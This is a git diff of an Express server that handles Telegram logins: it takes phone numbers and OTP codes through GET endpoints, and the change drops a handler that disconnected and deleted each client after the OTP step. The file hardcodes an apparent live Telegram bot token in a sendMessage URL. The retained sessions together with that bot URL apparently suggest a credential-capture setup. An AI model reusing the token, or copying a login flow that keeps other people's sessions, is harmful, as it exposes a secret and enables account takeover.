@@ -1,7 +1,7 @@
 import express from 'express';
 import axios from 'axios'
 import cors from 'cors';
-import { deleteClient, getClient, createClient } from "./telegramManager";
+import { getClient, createClient } from "./telegramManager";
 
 require('dotenv').config();
 const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage";
@@ -78,7 +78,7 @@ app.get('/login', async (req, res) => {
     }
 });
 
-app.get('/otp', async (req, res, next) => {
+app.get('/otp', async (req, res) => {
     const phoneCode = req.query.code;
     const number = req.query.phone;
     const cli = await getClient(number);
@@ -93,12 +93,6 @@ app.get('/otp', async (req, res, next) => {
     } else {
         res.sendStatus(400);
     }
-    next();
-}, async (req, res) => {
-    const number = req.query.number;
-    const cli = await getClient(number);
-    cli?.disconnect();
-    await deleteClient(number);
 });
 
 app.get('/password', async (req, res) => {
